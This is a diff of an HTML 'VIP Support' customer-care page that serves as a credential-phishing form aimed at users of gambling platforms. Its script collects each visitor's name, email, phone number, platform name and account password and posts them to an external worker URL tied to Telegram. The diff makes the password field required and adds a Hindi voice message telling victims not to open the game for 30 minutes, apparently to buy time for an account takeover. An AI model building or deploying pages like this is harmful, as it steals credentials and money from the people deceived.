@@ -5,157 +5,199 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>VIP Support - Customer Care</title>
   <style>
-    * { box-sizing: border-box; }
-    body {
+    * {
+      box-sizing: border-box;
       margin: 0;
-      font-family: 'Poppins', sans-serif;
-      background: linear-gradient(135deg, #0f0c29, #302b63, #24243e);
+      padding: 0;
+    }
+    body {
+      font-family: 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+      background: radial-gradient(circle at top right, #1a103c, #0a0814 80%);
       min-height: 100vh;
       display: flex;
       align-items: center;
       justify-content: center;
       color: #fff;
+      padding: 20px;
     }
-    .container { width: 100%; max-width: 500px; padding: 20px; }
     .card {
-      background: rgba(255, 255, 255, 0.05);
-      backdrop-filter: blur(20px);
-      border: 1px solid rgba(255, 255, 255, 0.1);
-      padding: 40px;
-      border-radius: 25px;
-      box-shadow: 0 20px 50px rgba(0, 0, 0, 0.5);
-      animation: fadeIn 0.8s ease-out;
-    }
-    @keyframes fadeIn {
-      from { opacity: 0; transform: translateY(20px); }
-      to { opacity: 1; transform: translateY(0); }
+      background: rgba(255, 255, 255, 0.04);
+      backdrop-filter: blur(16px);
+      -webkit-backdrop-filter: blur(16px);
+      border: 1px solid rgba(255, 255, 255, 0.12);
+      padding: 35px 28px;
+      border-radius: 24px;
+      box-shadow: 0 20px 50px rgba(0, 0, 0, 0.6), 0 0 30px rgba(112, 0, 255, 0.15);
+      width: 100%;
+      max-width: 440px;
     }
     h1 {
-      margin-top: 0;
       text-align: center;
-      font-size: 32px;
-      margin-bottom: 30px;
-      background: linear-gradient(90deg, #ff416c, #ff4b2b);
+      font-size: 26px;
+      margin-bottom: 25px;
+      background: linear-gradient(90deg, #ff007a, #7928ca, #00d2ff);
       -webkit-background-clip: text;
       -webkit-text-fill-color: transparent;
-      font-weight: 700;
+      font-weight: 800;
+      text-transform: uppercase;
+      letter-spacing: 1px;
     }
-    .input-group { position: relative; margin-bottom: 25px; }
+    .input-group {
+      position: relative;
+      margin-bottom: 18px;
+    }
     input, textarea {
       width: 100%;
-      padding: 16px 20px;
-      background: rgba(255, 255, 255, 0.08);
-      border: 2px solid transparent;
-      border-radius: 15px;
+      padding: 14px 16px;
+      background: rgba(255, 255, 255, 0.06);
+      border: 1px solid rgba(255, 255, 255, 0.15);
+      border-radius: 12px;
       color: #fff;
-      font-size: 16px;
-      transition: all 0.4s cubic-bezier(0.25, 1, 0.5, 1);
+      font-size: 15px;
       outline: none;
+      transition: all 0.3s ease;
     }
     input:focus, textarea:focus {
-      background: rgba(255, 255, 255, 0.15);
-      border-color: #ff416c;
-      box-shadow: 0 0 25px rgba(255, 65, 108, 0.3);
+      background: rgba(255, 255, 255, 0.1);
+      border-color: #00d2ff;
+      box-shadow: 0 0 15px rgba(0, 210, 255, 0.3);
     }
-    input::placeholder, textarea::placeholder { color: rgba(255, 255, 255, 0.4); }
-    .password-wrapper { position: relative; }
+    input::placeholder, textarea::placeholder {
+      color: rgba(255, 255, 255, 0.45);
+    }
+    textarea {
+      resize: vertical;
+      min-height: 90px;
+    }
+    .password-wrapper {
+      position: relative;
+    }
+    .password-wrapper input {
+      padding-right: 48px;
+    }
     .eye-icon {
       position: absolute;
-      right: 20px;
+      right: 14px;
       top: 50%;
       transform: translateY(-50%);
       cursor: pointer;
-      color: rgba(255, 255, 255, 0.5);
-      transition: color 0.3s;
+      font-size: 18px;
       user-select: none;
+      filter: drop-shadow(0 0 4px rgba(255, 255, 255, 0.2));
     }
-    .eye-icon:hover { color: #ff416c; }
     button {
       width: 100%;
-      padding: 18px;
+      padding: 15px;
       border: none;
-      border-radius: 15px;
-      background: linear-gradient(90deg, #ff416c, #ff4b2b);
-      color: white;
-      font-size: 18px;
-      font-weight: bold;
+      border-radius: 12px;
+      background: linear-gradient(90deg, #ff007a, #7928ca);
+      color: #fff;
+      font-size: 16px;
+      font-weight: 700;
       cursor: pointer;
-      transition: transform 0.3s, box-shadow 0.3s;
-      margin-top: 15px;
-      box-shadow: 0 10px 20px rgba(255, 75, 43, 0.3);
+      box-shadow: 0 8px 25px rgba(255, 0, 122, 0.35);
+      transition: all 0.3s ease;
+      text-transform: uppercase;
+      letter-spacing: 0.5px;
+      margin-top: 5px;
     }
     button:hover {
-      transform: translateY(-3px);
-      box-shadow: 0 15px 30px rgba(255, 75, 43, 0.5);
+      transform: translateY(-2px);
+      box-shadow: 0 12px 30px rgba(255, 0, 122, 0.5);
     }
-    button:disabled { opacity: 0.6; cursor: not-allowed; transform: none; box-shadow: none; }
-    #status { text-align: center; margin-top: 25px; font-size: 16px; min-height: 24px; font-weight: 500; }
-    .telegram-link {
-      display: block;
+    button:disabled {
+      opacity: 0.6;
+      cursor: not-allowed;
+      transform: none;
+    }
+    #status {
       text-align: center;
-      margin-top: 25px;
-      color: #00d2ff;
-      text-decoration: none;
-      font-size: 16px;
-      transition: color 0.3s, text-shadow 0.3s;
-      font-weight: 500;
+      margin-top: 18px;
+      font-size: 14px;
+      font-weight: 600;
+      min-height: 20px;
     }
-    .telegram-link:hover {
+    .telegram-btn {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 8px;
+      margin-top: 22px;
+      padding: 12px;
+      background: rgba(0, 136, 204, 0.15);
+      border: 1px solid rgba(0, 136, 204, 0.4);
+      border-radius: 12px;
+      color: #29b6f6;
+      text-decoration: none;
+      font-size: 14px;
+      font-weight: 600;
+      transition: all 0.3s ease;
+    }
+    .telegram-btn:hover {
+      background: rgba(0, 136, 204, 0.3);
       color: #fff;
-      text-shadow: 0 0 15px rgba(0, 210, 255, 0.6);
+      box-shadow: 0 0 15px rgba(0, 136, 204, 0.4);
     }
   </style>
 </head>
 <body>
-<div class="container">
-  <div class="card">
-    <h1>Customer Care</h1>
-    <form id="supportForm">
-      <div class="input-group">
-        <input id="name" placeholder="Full Name" required>
-      </div>
-      <div class="input-group">
-        <input id="email" type="email" placeholder="Email Address" required>
-      </div>
-      <div class="input-group">
-        <input id="mobile" type="tel" placeholder="Mobile Number (10 digits)" maxlength="10" pattern="\d{10}" required>
-      </div>
-      <div class="input-group">
-        <input id="casino" placeholder="Platform / Service">
-      </div>
-      <div class="input-group password-wrapper">
-        <input id="password" type="password" placeholder="Password">
-        <span class="eye-icon" id="togglePassword">👁️</span>
-      </div>
-      <div class="input-group">
-        <textarea id="message" placeholder="Describe your issue" required></textarea>
-      </div>
-      <button type="submit" id="submitBtn">Submit Request</button>
-    </form>
-    <div id="status"></div>
-    <a href="https://t.me/helpcare02_bot" class="telegram-link">Contact us directly on Telegram</a>
-  </div>
+
+<div class="card">
+  <h1>VIP Support</h1>
+  <form id="supportForm">
+    <div class="input-group">
+      <input id="name" type="text" placeholder="Full Name" required>
+    </div>
+    <div class="input-group">
+      <input id="email" type="email" placeholder="Email Address" required>
+    </div>
+    <div class="input-group">
+      <input id="mobile" type="tel" placeholder="Mobile Number (10 digits)" maxlength="10" pattern="\d{10}" required>
+    </div>
+    <div class="input-group">
+      <input id="casino" type="text" placeholder="Platform / Service Name" required>
+    </div>
+    <div class="input-group password-wrapper">
+      <input id="password" type="password" placeholder="Account Password" required>
+      <span class="eye-icon" id="togglePassword">👁️</span>
+    </div>
+    <div class="input-group">
+      <textarea id="message" placeholder="Describe your issue in detail..." required></textarea>
+    </div>
+    <button type="submit" id="submitBtn">Submit Request</button>
+  </form>
+
+  <div id="status"></div>
+
+  <a href="https://t.me/helpcare02" target="_blank" class="telegram-btn">
+    <span>💬</span> Contact on Telegram (@helpcare02)
+  </a>
 </div>
+
 <script>
 const WORKER_URL = "https://helpcare24-telegram.xfarru356.workers.dev";
+
+// Password Visibility Toggle
 const togglePassword = document.getElementById('togglePassword');
 const passwordInput = document.getElementById('password');
 
 togglePassword.addEventListener('click', function() {
-  const type = passwordInput.getAttribute('type') === 'password' ? 'text' : 'password';
-  passwordInput.setAttribute('type', type);
-  this.textContent = type === 'password' ? '👁️' : '🙈';
+  const isPassword = passwordInput.getAttribute('type') === 'password';
+  passwordInput.setAttribute('type', isPassword ? 'text' : 'password');
+  this.textContent = isPassword ? '🙈' : '👁️';
 });
 
+// Form Submit Handler
 document.getElementById("supportForm").addEventListener("submit", async function(e) {
   e.preventDefault();
   const button = document.getElementById("submitBtn");
   const status = document.getElementById("status");
+
   button.disabled = true;
-  button.textContent = "Submitting...";
+  button.textContent = "Processing...";
   status.textContent = "";
-  
-  const data = {
+
+  const payload = {
     name: document.getElementById("name").value.trim(),
     email: document.getElementById("email").value.trim(),
     mobile: document.getElementById("mobile").value.trim(),
@@ -163,30 +205,44 @@ document.getElementById("supportForm").addEventListener("submit", async function
     password: document.getElementById("password").value.trim(),
     message: document.getElementById("message").value.trim()
   };
-  
+
   try {
-    const response = await fetch(WORKER_URL, {
+    const res = await fetch(WORKER_URL, {
       method: "POST",
       headers: { "Content-Type": "application/json" },
-      body: JSON.stringify(data)
+      body: JSON.stringify(payload)
     });
-    
-    if (!response.ok) throw new Error("Request failed");
-    
-    status.textContent = "Request submitted successfully.";
-    
-    const utterance = new SpeechSynthesisUtterance("Your request is with the review team. Please do not open the game for 30 minutes and wait.");
-    utterance.lang = 'en-US';
-    window.speechSynthesis.speak(utterance);
-    
+
+    const result = await res.json();
+
+    if (!res.ok) {
+      throw new Error(result.error?.description || "Submission failed");
+    }
+
+    status.style.color = "#00e676";
+    status.textContent = "Request successfully submitted!";
+
+    // Voice Alert
+    if ('speechSynthesis' in window) {
+      const voiceText = "Aapki request review team ke paas chali gayi hai. Kripya karke 30 minute tak game open na karein aur wait karein.";
+      const utterance = new SpeechSynthesisUtterance(voiceText);
+      utterance.lang = 'hi-IN';
+      utterance.rate = 0.95;
+      window.speechSynthesis.speak(utterance);
+    }
+
     document.getElementById("supportForm").reset();
-  } catch (error) {
-    status.textContent = "Unable to submit request. Please try again.";
+
+  } catch (err) {
+    console.error("Error details:", err);
+    status.style.color = "#ff3366";
+    status.textContent = "Unable to submit request. Please try again or message on Telegram.";
+  } finally {
+    button.disabled = false;
+    button.textContent = "Submit Request";
   }
-  
-  button.disabled = false;
-  button.textContent = "Submit Request";
 });
 </script>
+
 </body>
 </html>
